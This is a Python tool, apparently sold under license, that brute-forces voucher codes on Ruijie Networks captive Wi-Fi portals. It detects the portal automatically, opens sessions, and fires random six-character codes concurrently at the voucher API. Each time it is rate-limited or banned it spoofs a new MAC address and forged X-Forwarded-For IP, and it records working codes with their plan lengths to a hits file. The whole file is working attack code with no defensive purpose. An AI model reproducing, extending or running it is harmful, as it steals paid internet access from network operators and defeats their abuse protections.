#!/usr/bin/env python3
# =====================================================================
# kavinv8.py - KAVIN FAST SPEED V8
# PART 1 of 4
# =====================================================================

import os, time, random, string, json, asyncio, socket, threading, requests
import aiohttp, urllib3
from urllib.parse import urlparse, parse_qs, quote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.layout import Layout
from rich.table import Table
from rich.align import Align

try:
    import license as _license
except ImportError:
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 25
RL_SLEEP = 0.1
MAC_IP_CHANGE_SLEEP = 0.5
TIMEOUT_SEC = 10
RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
APP_TITLE = "⚡ KAVIN FAST SPEED V8 ⚡"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": ""}

def gen_mac():
    return ':'.join(map(lambda x: "%02x" % x, [0x00, 0x16, 0x3e, random.randint(0, 127), random.randint(0, 255), random.randint(0, 255)]))

def gen_ip():
    return f"192.168.110.{random.randint(2, 254)}"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_device_id():
    return _license.get_stable_device_id() if _license else "UNKNOWN"
def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except: return "192.168.110.1"

def extract_params(url):
    q = parse_qs(urlparse(url).query)
    return {k: q[k][0] for k in ['gw_id','gw_sn','gw_address','gw_port','ip','mac','slot_num','nasip','ssid','url','chap_id','chap_challenge'] if k in q}

def auto_detect():
    console.print(Panel(Align.center(Text("AUTO DETECTING PORTAL URL...", style="cyan")), border_style="cyan"))
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    try:
        r = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url: return r.url
    except: pass
    for gw in [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]:
        try:
            r = s.get(f"http://{gw}", timeout=5)
            if "ruijienetworks" in r.url: return r.url
        except: pass
    return None

async def fetch_session(session, gw_params, mac, ip):
    p = dict(gw_params)
    p['mac'], p['ip'] = mac, ip
    url = f"{RUIJIE_BASE}/api/auth/wifidog?" + "&".join([f"{k}={quote(str(v))}" for k, v in p.items()])
    headers = {'User-Agent': 'Mozilla/5.0', 'Client-Mac': mac, 'X-Forwarded-For': ip}
    try:
        session.cookie_jar.clear()
        async with session.get(url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r:
            loc = r.headers.get('Location', '')
            if loc:
                if "limited" in loc.lower() or "error" in loc.lower() or "banned" in loc.lower(): return None, "BAN"
                q = parse_qs(urlparse(loc).query)
                sid = q.get('sessionId', [None])[0]
                if sid: return {'sessionId': sid, 'sign': q.get('sign', [None])[0], 'timestamp': q.get('timestamp', [None])[0]}, "REAL"
    except: pass
    return None, "FAILED"

async def test_code(session, sess, code, mac, ip):
    url = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"
    if sess.get('sign') and sess.get('timestamp'):
        url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"
    headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "Client-Mac": mac, "X-Forwarded-For": ip}
    payload = {"accessCode": code, "sessionId": sess['sessionId'], "apiVersion": 1}
    if sess.get('sign'): payload["sign"] = sess['sign']
    if sess.get('timestamp'): payload["timestamp"] = sess['timestamp']
    try:
        async with session.post(url, json=payload, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r:
            if r.status == 429: return "__RL__", "1HR"
            text = await r.text()
            low = text.lower()
            if "limited" in low or "too many" in low: return "__RL__", "1HR"
            if "session timed out" in low or "invalid session" in low: return "__EXP__", "1HR"
            plan = "1HR"
            if "24hr" in low or "1day" in low: plan = "24HR"
            elif "12hr" in low: plan = "12HR"
            elif "2hr" in low: plan = "2HR"
            return text, plan
    except: return "__ERR__", "1HR"

def gen_code(mode, length):
    if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
    if mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
def make_dash(mode, code, tested, elapsed, status, hits, speed, mac, sess_stat, sess_id, ban_count, last_ban):
    layout = Layout()
    layout.split_column(Layout(Panel(Align.center(Text(APP_TITLE, style="bold bright_cyan")), border_style="cyan"), size=3), Layout(name="body"))
    
    grid = Table.grid(expand=True, padding=(0, 1))
    grid.add_column(style="bold white"); grid.add_column(style="bold cyan"); grid.add_column(style="bold white"); grid.add_column(style="bold green")
    
    sess_style = "bold green" if sess_stat == "REAL" else "bold red"
    grid.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
    grid.add_row("  🎯 Mode", f": {mode.upper()}", "  📊 Tested", f": {tested:,}")
    grid.add_row("  ⚡ Speed", f": {int(speed)} c/m", "  📡 Status", f": {status.upper()}")
    grid.add_row("  🔑 Hits", f": {len(hits)}", "  📌 Engine", ": RANDOM")
    grid.add_row("  🖥 MAC", f": ...{mac[-8:]}", "  🔐 Session", f": {sess_stat}", style=sess_style)
    
    ban_style = "bold red" if ban_count > 0 else "bold green"
    grid.add_row("  🚫 Ban Count", f": {ban_count}", "  ⏰ Last Ban", f": {last_ban or '--:--:--'}", style=ban_style)

    v_table = Table(show_header=True, header_style="bold white", expand=True, border_style="green")
    v_table.add_column("Voucher Hits", style="bold green", justify="center")
    v_table.add_column("Plan", style="bold green", justify="center")
    for h in hits[-10:]: v_table.add_row(h['code'], h['plan'])
    if not hits: v_table.add_row("No hits yet...", "")

    layout["body"].split_column(
        Layout(Panel(grid, border_style="magenta"), size=7),
        Layout(Panel(Align.center(Text(f"Check Code : {code}", style="bold yellow")), border_style="yellow"), size=3),
        Layout(v_table, ratio=1),
        Layout(Panel(Align.center(Text("✨ Thank You For Choosing @kavin799 Tools ✨", style="bold bright_yellow")), border_style="red"), size=3)
    )
    return layout
async def scan_loop(gw_params):
    current_mac, current_ip, sess = [gen_mac()], [gen_ip()], [None]
    tested, hits, ban_count, last_ban = 0, [], 0, ""
    sess_stat, sess_id = "--------", "--------"
    start_time = time.time()
    
    connector = aiohttp.TCPConnector(limit=50, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        live = Live(make_dash("MIX", "", 0, "00:00:00", "INIT", [], 0, current_mac[0], sess_stat, sess_id, 0, ""), refresh_per_second=2, screen=False)
        with live:
            try:
                while True:
                    if sess[0] is None:
                        res, msg = await fetch_session(session, gw_params, current_mac[0], current_ip[0])
                        if not res:
                            current_mac[0], current_ip[0] = gen_mac(), gen_ip()
                            ban_count += 1
                            last_ban = time.strftime("%H:%M:%S")
                            sess_stat = "REFRESHING"
                            await asyncio.sleep(MAC_IP_CHANGE_SLEEP)
                            continue
                        sess[0], sess_stat, sess_id = res, "REAL", res['sessionId'][:8]

                    batch = []
                    while len(batch) < CONCURRENCY_LIMIT:
                        c = gen_code("mix", 6)
                        with code_lock:
                            if c not in tried_codes:
                                tried_codes.add(c); batch.append(c)
                    if not batch: continue

                    async def check(c):
                        async with asyncio.Semaphore(CONCURRENCY_LIMIT):
                            return await test_code(session, sess[0], c, current_mac[0], current_ip[0])

                    results = await asyncio.gather(*[check(c) for c in batch])
                    
                    for idx, (res, plan) in enumerate(results):
                        tested += 1
                        if res == "__EXP__" or res == "__RL__":
                            sess[0] = None
                            current_mac[0], current_ip[0] = gen_mac(), gen_ip()
                            if res == "__RL__":
                                ban_count += 1
                                last_ban = time.strftime("%H:%M:%S")
                                sess_stat = "BANNED"
                            else:
                                sess_stat = "EXPIRED"
                            await asyncio.sleep(MAC_IP_CHANGE_SLEEP)
                            break
                        
                        if '"success":true' in res.lower() or '"logonUrl"' in res:
                            hits.append({"code": batch[idx], "plan": plan})
                            sess[0] = None
                            current_mac[0], current_ip[0] = gen_mac(), gen_ip()
                            sess_stat = "HIT"
                            with open(HITS_FILE, "a") as f: f.write(f"CODE: {batch[idx]} | PLAN: {plan}\n")
                            await asyncio.sleep(MAC_IP_CHANGE_SLEEP)
                            break

                    elapsed = time.time() - start_time
                    speed = (tested / elapsed * 60) if elapsed > 0 else 0
                    live.update(make_dash("MIX", batch[-1], tested, f"{int(elapsed//3600):02d}:{int((elapsed%3600)//60):02d}:{int(elapsed%60):02d}", "ACTIVE", hits, speed, current_mac[0], sess_stat, sess_id, ban_count, last_ban))
            except Exception as e:
                pass

def main():
    clear()
    if not _license: return
    is_valid, msg = _license.check_approval()
    while not is_valid:
        clear()
        console.print(Panel(Align.center(Text(f"{APP_TITLE}\n\n🔐 LICENSE REQUIRED\n\nYour Device ID:\n{_license.get_stable_device_id()}\n\nဒီ ID ကို key ထုတ်ဖို့ ပို့ပါ။", style="yellow")), border_style="yellow"))
        console.print(f"[red]Status:[/red] {msg}")
        key = Prompt.ask(" ➜ 📝 Paste License Key (Enter=exit)").strip()
        if not key: return
        ok, new_msg = _license.activate(key)
        console.print(f"[green]{new_msg}[/green]" if ok else f"[red]{new_msg}[/red]")
        time.sleep(2)
        is_valid, msg = _license.check_approval()
    
    LICENSE_INFO["status"] = msg
    url = auto_detect()
    if not url: return
    gw = extract_params(url)
    
    clear()
    console.print(Panel(Align.center(Text("Choose Mode:\n1. NUM\n2. ENG\n3. MIX", style="cyan")), border_style="cyan"))
    ch = input(" ➜ ").strip()
    mode = "num" if ch == "1" else "eng" if ch == "2" else "mix"
    
    asyncio.run(scan_loop(gw))

if __name__ == "__main__":
    main()